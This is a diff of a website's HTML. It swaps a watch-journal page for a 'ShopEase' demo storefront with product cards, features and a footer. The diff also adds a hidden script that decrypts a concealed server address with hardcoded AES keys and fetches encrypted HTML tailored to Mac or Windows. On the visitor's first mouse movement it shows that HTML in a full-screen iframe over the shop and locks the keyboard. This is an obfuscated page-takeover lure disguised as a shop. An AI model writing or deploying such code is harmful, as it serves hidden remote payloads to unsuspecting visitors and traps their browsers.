-                <div class="new-arrival-item">
-                    <div class="new-arrival-item-image">
-                        <a href="blog.html">
-                            <figure>
-                                <img src="assets/img/arrival_1.jpg" alt="Royal Chrono Masterpiece">
-                            </figure>
-                        </a>
-                    </div>
-                    <div class="new-arrival-item-content">
-                        <ul>
-                            <li>Luxury</li>
-                        </ul>
-                        <h2><a href="blog.html">Royal Chrono Masterpiece</a></h2>
-                    </div>
-                </div>
-                
-                <div class="new-arrival-item">
-                    <div class="new-arrival-item-image">
-                        <a href="blog.html">
-                            <figure>
-                                <img src="assets/img/arrival_2.jpg" alt="Classic Gold Heritage">
-                            </figure>
-                        </a>
-                    </div>
-                    <div class="new-arrival-item-content">
-                        <ul>
-                            <li>Formal</li>
-                        </ul>
-                        <h2><a href="blog.html">Classic Gold Heritage</a></h2>
-                    </div>
-                </div>
-                
-                <div class="new-arrival-item">
-                    <div class="new-arrival-item-image">
-                        <a href="blog.html">
-                            <figure>
-                                <img src="assets/img/arrival_3.jpg" alt="Elite Black Edition Watch">
-                            </figure>
-                        </a>
-                    </div>
-                    <div class="new-arrival-item-content">
-                        <ul>
-                            <li>Premium</li>
-                        </ul>
-                        <h2><a href="blog.html">Elite Black Edition Watch</a></h2>
-                    </div>
-                </div>
-            </div>
-
-            <div class="row">
-                <div class="col-lg-12">
-		            <div class="section-footer-text text-center mt-4">
-			            <p><span>Free</span> Discover Our New Watch Collection and Elevate Your Everyday Look.</p>
-		            </div>
-                </div>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </div>
-    <!-- New Arrivals Section End -->
+      </div>
+    </section>
 
-    <!-- Latest Updates Section Start -->
-    <div class="latest-updates">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-12">
-                    <div class="section-title-center">
-                        <span class="section-sub-title">Follow Us On Social</span>
-                        <h2>Explore our latest updates</h2>
-                        <p>Stay up to date with our latest collections, exclusive offers, and style inspiration. Follow us to never miss what’s new and trending.</p>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="latest-update-video-list">
-                <div class="latest-update-video">
-                    <img src="assets/img/social_1.jpg" alt="Social Update 1">
-                </div>
-                
-                <div class="latest-update-video">
-                    <img src="assets/img/social_2.jpg" alt="Social Update 2">
-                </div>
-                
-                <div class="latest-update-video">
-                    <img src="assets/img/social_3.jpg" alt="Social Update 3">
-                </div>
-            </div>
-        </div>
-    </div>
-    <!-- Latest Updates Section End -->
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
 
-    <footer>
-        <div class="container">
-            <div class="footer-grid">
-                <div class="footer-brand">
-                    <h3>Wrist Vista Journal</h3>
-                    <p>Independent research and logs for artisan carry textiles, organic plant dye chemistry, and academic bag ergonomics.</p>
-                </div>
-                <div class="footer-col">
-                    <h4>Explore</h4>
-                    <ul>
-                        <li><a href="about.html">Atelier Craft</a></li>
-                        <li><a href="blog.html">Watch Logs</a></li>
-                        <li><a href="contact.html">Curator Desk</a></li>
-                    </ul>
-                </div>
-                <div class="footer-col">
-                    <h4>Contact</h4>
-                    <p>181 Mercer Street, New York, NY 10012, United States</p>
-                    <p><a href="tel:+1-888-777-5845">+1-888-777-5845</a></p>
-                </div>
-                <div class="footer-col">
-                    <h4>Policies</h4>
-                    <ul>
-                        <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                        <li><a href="cookies.html">Cookies Policy</a></li>
-                        <li><a href="disclaimer.html">Disclaimer</a></li>
-                        <li><a href="terms.html">Terms of Service</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2026 Wrist Vista Journal. Independent scholarly carry archive, not a retail shop.</p>
-            </div>
-        </div>
-    </footer>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-    <script src="assets/app.js"></script>
-    <script>
-        // Preloader Fade Out
-        window.addEventListener('load', () => {
-            const preloader = document.getElementById('preloader');
-            if (preloader) {
-                preloader.classList.add('fade-out');
-            }
-        });
-    </script>
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
